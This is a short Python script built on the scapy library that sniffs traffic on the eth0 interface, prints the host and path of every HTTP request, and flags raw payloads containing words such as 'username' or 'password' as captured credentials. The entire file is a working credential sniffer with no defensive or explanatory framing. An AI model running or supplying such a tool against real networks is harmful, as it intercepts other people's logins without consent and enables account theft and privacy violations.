#!/usr/bin/env python

#https://github.com/invernizzi/scapy-http/blob/master/example.py

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
			#print(packet[scapy.Raw].load) #Returns Username & Password Field
			load = packet[scapy.Raw].load
			keywords = ["username", "user", "login", "password", "pass"]
			for keyword in keywords:
				if bytes(keyword, 'utf-8') in load:
					return load
					

def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		#print(packet)
		#print(packet.show())
		url = get_url(packet)
		print("[+] HTTP Request >> " + str(url))

		login_info = get_login_info(packet)
		if login_info:
			print("\n\n[+] Possible Username/Password > " + str(login_info) + "\n\n")

sniff("eth0")